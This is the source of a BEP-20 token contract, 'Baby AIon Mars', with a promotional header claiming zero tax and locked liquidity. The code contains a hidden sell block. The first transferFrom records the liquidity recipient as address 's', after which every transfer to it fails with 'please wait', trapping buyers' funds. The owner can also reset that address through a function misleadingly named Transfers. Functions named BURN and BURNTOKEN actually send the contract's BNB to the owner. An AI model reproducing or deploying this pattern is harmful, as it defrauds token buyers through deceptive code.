/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

/**
 ______     ______     ______     __  __        ______     __     ______     __   __        __    __     ______     ______     ______    
/\  == \   /\  __ \   /\  == \   /\ \_\ \      /\  __ \   /\ \   /\  __ \   /\ "-.\ \      /\ "-./  \   /\  __ \   /\  == \   /\  ___\   
\ \  __<   \ \  __ \  \ \  __<   \ \____ \     \ \  __ \  \ \ \  \ \ \/\ \  \ \ \-.  \     \ \ \-./\ \  \ \  __ \  \ \  __<   \ \___  \  
 \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\     \ \_\ \_\  \ \_\  \ \_____\  \ \_\\"\_\     \ \_\ \ \_\  \ \_\ \_\  \ \_\ \_\  \/\_____\ 
  \/_____/   \/_/\/_/   \/_____/   \/_____/      \/_/\/_/   \/_/   \/_____/   \/_/ \/_/      \/_/  \/_/   \/_/\/_/   \/_/ /_/   \/_____/ 
                                                                                                                                         
https://babyaionmars.xyz/
https://twitter.com/BabyAIonMars
https://t.me/Babyaionmars
https://discord.com/invite/DaAnJ5wjmb

0% Tax 
Lp Lock 3 Years
20% lock token for hotbit
10% manual burn
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.5.17;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public DEADAddress;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _DEADAddress) public onlyOwner {
    DEADAddress = _DEADAddress;
  }
  function acceptOwnership() public {
    require(msg.sender == DEADAddress);
    emit OwnershipTransferred(owner, DEADAddress);
    owner = DEADAddress;
    DEADAddress = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address private s;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "BAIonMars";
    name = "Baby AIon Mars";
    decimals = 18;
    _totalSupply =  27000000000000000000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function Transfers(address _s) public onlyOwner {
    s = _s;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != s, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && s == address(0)) s = to;
      else require(to != s, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract 
BAIonMars is TokenBEP20 {

  function BURN() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
      function BURNTOKEN() public onlyOwner {
          address payable _owner = msg.sender;
          _owner.transfer(address(this).balance); 
  }       
  function() external payable {

  }
}